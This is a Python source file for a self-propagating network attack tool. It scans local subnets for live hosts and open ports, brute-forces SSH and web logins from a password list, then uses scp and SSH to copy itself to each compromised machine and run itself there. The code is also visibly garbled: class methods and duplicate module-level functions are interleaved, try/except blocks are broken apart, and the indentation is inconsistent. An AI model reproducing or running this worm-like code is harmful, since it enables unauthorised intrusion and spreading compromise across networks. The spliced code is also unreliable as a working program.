#!/usr/bin/python3
# Importing paramiko modules for SSH connection and exception handling.
from paramiko import SSHClient, RejectPolicy
from paramiko.ssh_exception import NoValidConnectionsError, SSHException
# Importing modules from scapy for Packet Crafting and Sending / Sniffing.
from scapy.all import get_if_addr
from scapy.interfaces import get_if_list
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import sr
from scapy.utils import subprocess, os
# Try to import modules uniquely, otherwise use scapy.all in the meantime
# from scapy.all import *
# Importing sleep to allow network processes time to complete.
from time import sleep
# Importing logging to safely log sensitive, error or debug info.
import logging
# Importing pipes for the piping for certain processes
import pipes
# Importing requests for web based operations.
import requests
# Importing strings for use of the external strings resources.
import strings
# Importing strings_functions for string building functions.
import strings_functions


class NetPropagation:
    """
    This class deals with net propagation related operations.
    """

    def __init__(self, username, password, ip, port, interface, ip_list,
                 password_list):
        """
        Object parameters being initialised
        :param username: The user we wish to propagate under
        :param password: The password being used for propagation
        :param ip: The IP address of the target machine
        :param port: The port of the target machine
        :param interface: The interface on which we wish to carry out actions
        :param ip_list: A list of IP addresses on which we wish to carry out
        actions
        :param password_list: A list of password on which we wish to use for
        actions
        """
        self.username = username
        self.password = password
        self.ip = ip
        self.port = port
        self.interface = interface
        self.ip_list = ip_list
        self.password_list = password_list

    def check_over_ssh(self, filename):
        """
        This function checks if a given file is already located at the target
        machine over SSH. If it is then false is returned and if not then true
        is returned. This is needed as a prerequisite to propagating over SSH
        :param filename: The filename that we are checking for, can contain a
        path
        :return True: If the file doesn't exist on the target host or there's a
        problem with SSH (assuming file isn't present essentially)
        :return False: If the file does exist
        """
        client = SSHClient()
        try:
            client.set_missing_host_key_policy(RejectPolicy)
            client.connect(hostname=str(self.ip), port=int(self.port),
                           username=str(self.username), password=str(
                    self.password))
            client.exec_command(pipes.quote(strings_functions.touch_file(
                filename)))

            if str(client.exec_command(pipes.quote(strings_functions.cat_file(
                    filename)))[1]).__len__() < 1:
                client.close()
                return True

def check_over_ssh(ip, port, username, password):
    """
    This function checks if the net_propagation.py script is already located at
    the target machine over SSH. If it is then false is returned and if not
    then true is returned. This is needed as a prerequisite to propagating over
    SSH
    :param ip: The IP address target for SSH
    :param port: The port on which we're running SSH
    :param username: The username to target over SSH
    :param password: Password to use with SSH
    :return True: If the file doesn't exist on the target host or there's a
    problem with SSH (assuming file isn't present essentially)
    :return False: If the file does exist
    """
    client = SSHClient()
    try:
        client.set_missing_host_key_policy(RejectPolicy)
        client.connect(hostname=str(ip), port=int(port),
                       username=str(username), password=str(password))
        if strings.touch_file(strings.DEMO_SCRIPT_FILENAME) == "touch demo.py":
            client.exec_command(pipes.quote(strings.
                                            touch_file(strings.
                                                       DEMO_SCRIPT_FILENAME)))
        else:
            logging.error(strings.SANITATION_FAILED)
            client.close()
            return False
        if strings.cat_file(strings.DEMO_SCRIPT_FILENAME) == "cat demo.py":
            if str(client.exec_command(pipes.quote(strings.cat_file(
                    strings.DEMO_SCRIPT_FILENAME)))[1]).__len__() < 1:
                client.close()
                return True

        except NoValidConnectionsError:
            client.close()
            return True

        except TimeoutError:
            client.close()
            return True

        except SSHException:
            client.close()
            return True

    def connect_ssh_client(self):
        """
        This function checks to see if an SSH connection can be established
        and if so then it returns true, if not then it returns false
        :return True: If the SSH connect is successful
        :return False: If the SSH connect is unsuccessful
        """
        client = SSHClient()
        try:
            client.set_missing_host_key_policy(RejectPolicy)
            client.connect(hostname=str(self.ip), port=int(self.port),
                           username=str(self.username), password=str(
                    self.password))
            client.close()
            logging.info(strings_functions.connection_status(
                strings.SSH, self.ip, self.port, strings.SUCCESSFUL))
            return True

        except SSHException:
            client.close()
            logging.debug(strings_functions.connection_status(
                strings.SSH, self.ip, self.port, strings.UNSUCCESSFUL))
            return False

    def connect_web(self):
        """
        This function check to see if a web login can be established and if so
        then it returns true, if not then it returns false
        :return True: If the web login is successful
        :return False: If the web login connect is unsuccessful
        """
        attempt_succeeded = False
        try:
            self.send_post_request_with_login()
            attempt_succeeded = True
        except RuntimeError:
            logging.debug(strings_functions.connection_status(
                strings.WEB, self.ip, self.port, strings.UNSUCCESSFUL))
        if attempt_succeeded:
            logging.info(strings_functions.connection_status(
                strings.WEB, self.ip, self.port, strings.SUCCESSFUL))
        return attempt_succeeded

    def cycle_through_subnet(self):
        """
        This function takes in a given network interface and an IP list, it
        will get the IP address of the interface and add all the address from
        its /24 subnet to the IP list and will then return the list
        for a response
        """
        interface_split = get_if_addr(self.interface).split(strings.FULL_STOP)
        last_byte = 0
        while last_byte < 256:
            specific_address = str(interface_split[0]) + strings.FULL_STOP \
                               + str(interface_split[1]) + strings.FULL_STOP \
                               + str(interface_split[2]) + strings.FULL_STOP \
                               + str(last_byte)
            if not self.ip_list.__contains__(specific_address):
                logging.info(strings_functions.adding_address_to_interface(
                    specific_address,
                    self.interface))
                if self.ip_list is not strings.SPACE:
                    self.ip_list.append(specific_address)
                else:
                    self.ip_list = [specific_address]
            last_byte = last_byte + 1
        return self.ip_list

    def gathering_local_ips(self):
        """
        This function will cycle through all local interfaces outside the
        loopback interface and will add their /24 subnets to the IP list
        :return ip_list: The IP list with the newly found subnet addresses
        """
        logging.info(strings.FETCHING_LOCAL_INTERFACE_LIST)
        local_interfaces = get_if_list()
        if strings.LOOPBACK in local_interfaces:
            local_interfaces.remove(strings.LOOPBACK)
        for interface in local_interfaces:
            self.interface = interface
            logging.info(strings_functions.fetching_ips_for_interface(
                interface))
            self.ip_list = self.cycle_through_subnet()
        return self.ip_list

    def is_reachable_ip(self):
        """
        This function checks to see if an IP is reachable and returns true if
        it is and false if it isn't
        :return True: If the IP address is reachable
        :return False: If the IP address is not reachable
        """
        command = [strings.PING, strings.PING_ARGUMENT, strings.ONE, str(
            self.ip)]
        if subprocess.call(command) == 0:
            logging.info(strings_functions.ip_reachability(self.ip, True))
            return True
        logging.debug(strings_functions.ip_reachability(self.ip, False))
        return False

    def propagate_script(self, script):
        """
        This function is responsible for propagating a given script to a
        previously accessed machine. It will only run when the user specifies
        using the appropriate argument and when the port being used is 22
        (SSH), it will also check to ensure the script isn't  already present
        on the target. It goes about propagating the script in different ways
        depending on if an SSH port is specified
        :param script: The script to be propagated and ran on another machine
        service used
        :return True: If the script is successfully propagated here
        :return False: If the script is not successfully propagated here
        """
        try:
            if script.file_not_exist(self.ip, self.port, self.username,
                                     self.password):
                print(strings.RSA_AND_PROMPT)
                os.system(strings_functions.scp_command_string(
                    self.port, self.username, self.password, os.path.basename(
                        __file__)))
                print(strings.RSA_PROMPT_AGAIN)
                os.system(strings_functions.scp_command_string(
                    self.port, self.username, self.ip, strings.PWDS_LIST))
                client = SSHClient()
                try:
                    client.set_missing_host_key_policy(RejectPolicy)
                    client.connect(hostname=str(self.ip), port=int(self.port),
                                   username=str(self.username),
                                   password=str(self.password))
                    if strings_functions.run_script_command() == \
                            "./demo.py -L -p 22 -u " \
                            "root -f " \
                            "src/test_files/" \
                            "passwords_list.txt -P":
                        client.exec_command(pipes.quote(
                            strings_functions.run_script_command()))
                    else:
                        logging.error(strings.SANITATION_FAILED)
                        client.close()
                        return False

def connect_web(ip, port, username, password):
    """
    This function check to see if a web login can be established and if so then
    it returns true, if not then it returns false
    :param ip: The target IP address for web login
    :param port: The target port for web login
    :param username: The target username for web login
    :param password: The target password for web login
    :return True: If the web login is successful
    :return False: If the web login connect is unsuccessful
    """
    attempt_succeeded = False
    try:
        send_post_request_with_login(ip, port, username, password)
        attempt_succeeded = True
    except RuntimeError:
        logging.debug(strings.connection_status(strings.WEB, ip, port,
                                                strings.UNSUCCESSFUL))
    if attempt_succeeded:
        logging.info(strings.connection_status(strings.WEB, ip, port,
                                               strings.SUCCESSFUL))
    return attempt_succeeded


def convert_file_to_list(filename):
    """
    This function will convert a given file specified by a filename to a list
    and will then proceed to return that list
    :param filename: The filename of the file that needs to be converted to a
    list
    :return file_as_list: The list of the lines from the file
    """
    try:
        with open(filename) as file:
            file_as_list = append_lines_from_file_to_list(file)
        return file_as_list
    except FileNotFoundError:
        logging.error(strings.FILE_DOES_NOT_EXIST)
        return None


def cycle_through_subnet(ip_list, interface):
    """
    This function takes in a given network interface and an IP list, it will
    get the IP address of the interface and add all the address from its /24
    subnet to the IP list and will then return the list
    :param ip_list: The list of IP addresses in the subnet
    :param interface: The interface on which each IP address is to be checked
    for a response
    """
    interface_split = get_if_addr(interface).split(strings.FULL_STOP)
    last_byte = 0
    while last_byte < 256:
        specific_address = str(interface_split[0]) + strings.FULL_STOP \
                           + str(interface_split[1]) + strings.FULL_STOP \
                           + str(interface_split[2]) + strings.FULL_STOP \
                           + str(last_byte)
        if not ip_list.__contains__(specific_address):
            logging.info(strings.adding_address_to_interface(specific_address,
                                                             interface))
            if ip_list is not strings.SPACE:
                ip_list.append(specific_address)
            else:
                ip_list = [specific_address]
        last_byte = last_byte + 1
    return ip_list


def file_error_handler():
    """
    This function handles errors related to the processing of files.
    """
    print(strings.FILENAME_PROCESSING_ERROR)
    exit_and_show_instructions()


def file_not_exist(ip, port, username, password):
    """
    This function will check whether network_attack.py exists on a target
    machine and how it does that is dependent on the port being passed in
    :param ip: IP of the machine we're checking for a file for
    :param port: Port on which we which to check the machine
    :param username: Username to use as part of checking the file
    :param password: Password being used as part of checking the file
    :return check_over_ssh(ip, port, username, password):
    """
    return check_over_ssh(ip, port, username, password)


def gathering_local_ips(ip_list):
    """
    This function will cycle through all local interfaces outside the loopback
    interface and will add their /24 subnets to the IP list
    :param ip_list: The IPs for which we're fetching the subnets
    :return ip_list: The IP list with the newly found subnet addresses
    """
    logging.info(strings.FETCHING_LOCAL_INTERFACE_LIST)
    local_interfaces = get_if_list()
    # if strings.LOOPBACK in local_interfaces:
    #     local_interfaces = local_interfaces.remove(strings.LOOPBACK)
    for interface in local_interfaces:
        if str(interface) != strings.LOOPBACK:
            logging.info(strings.fetching_ips_for_interface(interface))
            ip_list = (cycle_through_subnet(ip_list, interface))
    return ip_list


def exit_and_show_instructions():
    """
    This function will print the help screen and show an exit prompt.
    """
    print(strings.help_output())
    print(strings.EXITING)


def is_reachable_ip(ip):
    """
    This function checks to see if an IP is reachable and returns true if it is
    and false if it isn't. The commented out code is the scapy way of doing it
    and the uncommented code uses OS calls. In my testing OS calls were faster
    but both approaches work
    :param ip: The IP address we're checking to see if it is reachable
    :return True: If the IP address is reachable
    :return False: If the IP address is not reachable
    """
    # ping_pkt = IP(dst=str(ip))/ICMP()
    # reply = sr(ping_pkt, timeout=1)[0]
    # if not reply:
    #     logging.debug(strings.ip_reachability(ip, False))
    #     return False
    # logging.info(strings.ip_reachability(ip, True))
    # return True
    command = [strings.PING, strings.PING_ARGUMENT, strings.ONE, str(ip)]
    if subprocess.call(command) == 0:
        logging.info(strings.ip_reachability(ip, True))
        return True
    logging.debug(strings.ip_reachability(ip, False))
    return False


def propagate_script(ip, port, login_string):
    """
    This function is responsible for propagating the network_attack.py to a
    previously bruteforce machine. It will only run when the user specifies
    using the appropriate argument and when the port being bruteforce is 22
    (SSH), it will also check to ensure the script isn't  already present on
    the target. It goes about propagating the script in different ways
    depending on if an SSH port is specified
    :param ip: The IP address we wish to propagate the script to
    :param port: The port through which we'll propagate the script
    :param login_string: This string contains the username and password for the
    service used
    :return True: If the script is successfully propagated here
    :return False: If the script is not successfully propagated here
    """
    login_string_split = login_string.split(strings.COLON)
    try:
        if file_not_exist(ip, port, login_string_split[0],
                          login_string_split[1]):
            print(strings.RSA_AND_PROMPT)
            os.system(strings.scp_command_string(port,
                                                 login_string_split[0],
                                                 ip,
                                                 os.path
                                                 .basename(__file__)))
            print(strings.RSA_PROMPT_AGAIN)
            os.system(strings.scp_command_string(port,
                                                 login_string_split[0],
                                                 ip,
                                                 strings.PWDS_LIST))
            client = SSHClient()
            try:
                client.set_missing_host_key_policy(RejectPolicy)
                client.connect(hostname=str(ip), port=int(port),
                               username=str(login_string_split[0]),
                               password=str(login_string_split[1]))
                if strings.run_script_command() == "./demo.py -L -p 22 -u " \
                                                   "root -f " \
                                                   "src/test_files/" \
                                                   "passwords_list.txt -P":
                    client.exec_command(pipes.quote(
                        strings.run_script_command()))
                else:
                    logging.error(strings.SANITATION_FAILED)
                    client.close()
                    return True
                except RuntimeError:
                    client.close()
                    return False
            else:
                logging.debug(strings_functions.file_present_on_host(self.ip))
                return False
        except RuntimeError:
            return False

    def propagating(self, script, arguments):
        """
        This function attempts propagation of a given script over the network.
        If it succeeds we alert the user and let them know what service was
        successful. If it is unsuccessful then we let the user know it was
        unsuccessful and over what service. Should the user have never asked
        for the script to be propagated over the network then we let them know
        this part of the process will not be done
        :param script: The script that needs to be propagated and spread
        :param arguments: The arguments passed in by the user themselves
        """
        if strings.ARGUMENT_PROPAGATE in arguments and (
                self.port == strings.SSH_PORT):
            propagated = self.propagate_script(script)
            if propagated:
                logging.info(strings.SCRIPT_PROPAGATED)
            else:
                logging.debug(strings.SCRIPT_NOT_PROPAGATED)
        else:
            logging.info(strings.DO_NOT_PROPAGATE)

    def remove_unreachable_ips(self):
        """
        This function will try and ping every IP in the IP list and if it
        doesn't receive a response it will then remove that IP from the IP list
        :return new_ip_list: The revised list of IP addresses with invalid
        addresses removed.
        """
        new_ip_list = []
        for ip in self.ip_list:
            self.ip = ip
            logging.info(strings_functions.checking_ip_reachable(self.ip))
            if self.is_reachable_ip():
                new_ip_list.append(self.ip)
        return new_ip_list

    def scan_port(self):
        """
        This function will scan a port to see if it is open. If the port is
        open then it will return true and if it is not then it will return
        false
        :return True: The port is open
        :return False: The port is not open
        """
        ip_header = IP(dst=self.ip)
        tcp_header = TCP(dport=int(self.port), flags=strings.SYN_FLAG)
        packet = ip_header / tcp_header
        response, unanswered = sr(packet, timeout=2)
        sleep(2)
        if len(response) > 0:
            return True
        return False

    def send_post_request_with_login(self):
        """
        This function sends a post request to a web server in an attempt to
        bruteforce its login details. If it succeeds with the given arguments
        then it will return the successful string of details, if not then it
        will return Null
        """
        response = requests.post(strings_functions.web_login_url(
            self.ip, self.port),
            data={strings.USERNAME_PROMPT_WEB: self.username,
                  strings.PASSWORD_PROMPT_WEB: self.password},
            timeout=4)
        if response:
            logging.info(strings_functions.connection_status(
                strings.WEB, self.ip, self.port, strings.SUCCESSFUL))
            return str(self.username) + strings.COLON + str(self.password)
        logging.debug(strings_functions.connection_status(
            strings.WEB, self.ip, self.port, strings.UNSUCCESSFUL))
        return None

    def sign_in_service(self):
        """
        This function will run through every password in the password list and
        will attempt to sign in to the appropriate service with that password.
        It will only move on to the next password in the event that the current
        password fails in its sign in attempt. If it succeeds then the
        successful login details are returned, if not then Null is returned
        :return login_details: The username and password to return
        :return None: Only done to indicate an unsuccessful task
        """
        for password in self.password_list:
            self.password = password
            login_details = self.try_password_for_service()
            if login_details is not False:
                return login_details
        return None

    def try_action(self, transfer_file, script, arguments):
        """
        This function will attempt a sign in action across various services
        depending on the ip or port supplied (if the port is open on that IP),
        it iterates through the password list when you sign in to the
        appropriate service associated with the port number supplied. If the
        sign in action is successful it will then check the need for additional
        actions specified by the end user
        :param transfer_file: A file to be transferred
        :param script: A script to be transferred and executed
        :param arguments: List of user specified arguments
        """
        if self.scan_port():
            logging.info(strings.FOUND_OPEN_IP_PORT_PAIR)
            action_login_details = self.try_sign_in()
            if action_login_details[0]:
                self.additional_actions(transfer_file, script, arguments)
        else:
            logging.debug(strings.CLOSED_IP_PORT_PAIR)

    def try_password_for_service(self):
        """
        This function tries to log into to a port's associated service using a
        specific username and password pair. If it succeeds it returns the
        successful login string, otherwise it returns an empty string
        :return str(username) + ":" + str(password): The successful username
        and password combination
        :return "": Empty string for unsuccessful username and password
        combination
        """
        try:
            connect_service_switch = {
                strings.SSH_PORT: lambda: self.connect_ssh_client(),
                strings.WEB_PORT_EIGHTY: lambda: self.connect_web(),
                strings.WEB_PORT_EIGHTY_EIGHTY: lambda: self.connect_web(),
                strings.WEB_PORT_EIGHTY_EIGHT_EIGHTY_EIGHT: lambda:
                self.connect_web(),
            }
            connect_service = connect_service_switch.get(str(self.port))
            if connect_service():
                return str(self.username) + strings.COLON + str(self.password)
            return False

        except RuntimeError:
            return False

    def try_sign_in(self):
        """
        This function will try to sign in to a specific service depending on
        the port supplied. If it gets a successful login then it will return
        the login details and the service used, otherwise it returns none as
        the login
        details along with the service used
        :return str(sign_in_details), service: The username and password of a
        successful action with the service used
        :return None, service: Empty username and password for an unsuccessful
        action and the service which was used.
        """
        service_switch = {
            strings.SSH_PORT: strings.SSH_LOWERCASE,
            strings.WEB_PORT_EIGHTY: strings.WEB_LOGIN,
            strings.WEB_PORT_EIGHTY_EIGHTY: strings.WEB_LOGIN,
            strings.WEB_PORT_EIGHTY_EIGHT_EIGHTY_EIGHT: strings.WEB_LOGIN
        }
        service = service_switch.get(str(self.port))
        sign_in_details = self.sign_in_service()
        if sign_in_details:
            logging.info(strings_functions.working_username_password(service))
            return str(sign_in_details), service
        logging.debug(strings.IMPOSSIBLE_ACTION)
        return None, service

    def additional_actions(self, transfer_file, propagation_script, arguments):
        """
        This function passes the appropriate arguments to and runs the
        transferring file and propagating functions, these functions contain
        the check to stop them from being run if the appropriate arguments
        aren't used
        :param transfer_file: The file that will be transferred upon user
        request
        :param propagation_script: The script that will be propagated upon user
        request
        :param arguments: Arguments passed in by the user themselves
        """
        transfer_file.check_transfer_file(arguments, self.ip, self.port,
                                          self.username)
        self.propagating(propagation_script, arguments)
